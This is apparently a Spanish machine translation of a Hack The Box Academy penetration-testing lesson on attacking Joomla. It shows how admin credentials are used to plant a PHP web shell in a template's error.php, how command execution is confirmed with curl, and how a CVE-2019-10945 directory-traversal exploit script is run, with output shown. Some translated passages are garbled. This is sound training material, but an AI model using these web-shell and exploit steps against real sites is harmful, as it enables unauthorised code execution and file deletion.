# Attacking Joomla

Ahora sabemos que estamos tratando con un sitio de comercio electrónico de Joomla. Si podemos obtener acceso, podemos aterrizar en el entorno interno del cliente y comenzar a enumerar el entorno de dominio interno. Al igual que WordPress y Drupal, Joomla ha tenido una buena cantidad de vulnerabilidades contra la aplicación central y las extensiones vulnerables. Además, como los demás, es posible obtener una ejecución de código remoto si podemos iniciar sesión en el backend admin.

---

# **Abusar de la funcionalidad incorporada**

Durante la fase de enumeración de Joomla y la búsqueda general de la investigación de datos de la compañía, podemos encontrar credenciales filtradas que podemos usar para nuestros propósitos. Usando las credenciales que obtuvimos en los ejemplos de la última sección,`admin:admin`, iniciamos sesión en el backend objetivo en`http://dev.inlanefreight.local/administrator`. Una vez iniciado sesión, podemos ver muchas opciones disponibles para nosotros. Para nuestros propósitos, nos gustaría agregar un fragmento de código PHP para obtener RCE. Podemos hacer esto personalizando una plantilla.

Si recibe un error que indica "se ha producido un error. Llame a un formato de función de miembro () en NULL" Después de iniciar sesión, navegue a "http: //dev.inlanefreight.local/administrator/index.php? Opción = comp_plugins" y deshabilite el tapón "iconado rápido - php vers" Esto permitirá que el panel de control se muestre correctamente.

![](https://academy.hackthebox.com/storage/modules/113/joomla_admin.png)

Desde aquí, podemos hacer clic en`Templates`en la parte inferior izquierda debajo`Configuration`Para sacar el menú de plantillas.

![](https://academy.hackthebox.com/storage/modules/113/joomla_templates.png)

A continuación, podemos hacer clic en un nombre de plantilla. Elegamos`protostar`bajo el`Template`Encabezado de columna. Esto nos traerá al`Templates: Customise`página.

![](https://academy.hackthebox.com/storage/modules/113/joomla_customise.png)

Finalmente, podemos hacer clic en una página para sacar la fuente de la página. Es una buena idea tener el hábito de usar nombres de archivos y parámetros no estándar para que nuestros shells web no sean fácilmente accesibles para un atacante "conducir" durante la evaluación. También podemos proteger e incluso limitar el acceso a nuestra dirección IP de origen. Además, siempre debemos recordar limpiar los shells web tan pronto como terminemos con ellos, pero aún incluir el nombre del archivo, el hash de archivo y la ubicación en nuestro informe final al cliente.

Elegamos el`error.php`página. Agregaremos un PHP One-Liner para obtener la ejecución del código de la siguiente manera.

Código:php

```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);

```

![](https://academy.hackthebox.com/storage/modules/113/joomla_edited.png)

Una vez que esto esté dentro, haga clic en`Save & Close`en la parte superior y confirme la ejecución del código usando`cURL`.

Atacando a Joomla

```
xnoxos@htb[/htb]$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=iduid=33(www-data) gid=33(www-data) groups=33(www-data)

```

Desde aquí, podemos actualizar a un shell inverso interactivo y comenzar a buscar vectores de escalada de privilegios locales o centrarnos en el movimiento lateral dentro de la red corporativa. Debemos estar seguros, una vez más, para anotar este cambio para nuestro informe Apéndices y hacer todo lo posible para eliminar el fragmento de PHP del`error.php`página.

---

# **Aprovechando vulnerabilidades conocidas**

Al momento de escribir, ha habido[426](https://www.cvedetails.com/vulnerability-list/vendor_id-3496/Joomla.html)Vulnerabilidades relacionadas con Joomla que recibieron CVE. Sin embargo, solo porque se reveló una vulnerabilidad y recibió una CVE no significa que sea explotable o que esté disponible un exploit público de POC en funcionamiento. Al igual que con WordPress, las vulnerabilidades críticas (como las ejecución del código remoto) que afectan el núcleo de Joomla son raras. Buscar un sitio como`exploit-db`Muestra más de 1.400 entradas para Joomla, con la gran mayoría de las extensiones de Joomla.

Involucremos en una vulnerabilidad central de Joomla que afecta la versión`3.9.4`, que nuestro objetivo`http://dev.inlanefreight.local/`se descubrió que estaba funcionando durante nuestra enumeración. Revisando el Joomla[descargas](https://www.joomla.org/announcements/release-news/5761-joomla-3-9-4-release.html)página, podemos ver eso`3.9.4`fue lanzado en marzo de 2019. Aunque está desactualizado como estamos en Joomla`4.0.3`A partir de septiembre de 2021, es completamente posible encontrarse con esta versión durante una evaluación, especialmente contra una gran empresa que puede no mantener un inventario de aplicación adecuado y no es consciente de su existencia.

Investigando un poco, encontramos que esta versión de Joomla probablemente sea vulnerable a[CVE-2019-10945](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945)que es una vulnerabilidad de eliminación de archivos de transversal y autenticado de directorio. Podemos usar[este](https://www.exploit-db.com/exploits/46710)Explotar el script para aprovechar la vulnerabilidad y enumerar el contenido de la raíz web y otros directorios. Se puede encontrar la versión python3 de este mismo script[aquí](https://github.com/dpgg101/CVE-2019-10945). También podemos usarlo para eliminar archivos (no recomendados). Esto podría conducir al acceso a archivos confidenciales, como un archivo de configuración o script que contiene credenciales si podemos acceder a él a través de la URL de la aplicación. Un atacante también podría causar daños al eliminar los archivos necesarios si el usuario del servidor web tiene los permisos adecuados.

Podemos ejecutar el script especificando el`--url`, `--username`, `--password`, y`--dir`banderas. Como Pentesters, esto solo nos sería útil si el portal de inicio de sesión de administrador no es accesible desde el exterior ya que, armado con credibilidades de administración, podemos obtener la ejecución de código remoto, como vimos anteriormente.

Atacando a Joomla

```
xnoxos@htb[/htb]$ python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion# Web Site: Haboob.sa# Email: research@haboob.sa# Versions: Joomla 1.5.0 through Joomla 3.9.4# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945     _    _          ____   ____   ____  ____
| |  | |   /\   |  _ \ / __ \ / __ \|  _ \
| |__| |  /  \  | |_) | |  | | |  | | |_) |
|  __  | / /\ \ |  _ <| |  | | |  | |  _ <
| |  | |/ ____ \| |_) | |__| | |__| | |_) |
|_|  |_/_/    \_\____/ \____/ \____/|____/

administrator
bin
cache
cli
components
images
includes
language
layouts
libraries
media
modules
plugins
templates
tmp
LICENSE.txt
README.txt
configuration.php
htaccess.txt
index.php
robots.txt
web.config.txt

```

---

# **Avanzar**

A continuación, echemos un vistazo a Drupal, que, aunque posee una parte mucho menor del mercado de CMS, todavía es utilizada por las empresas de todo el mundo.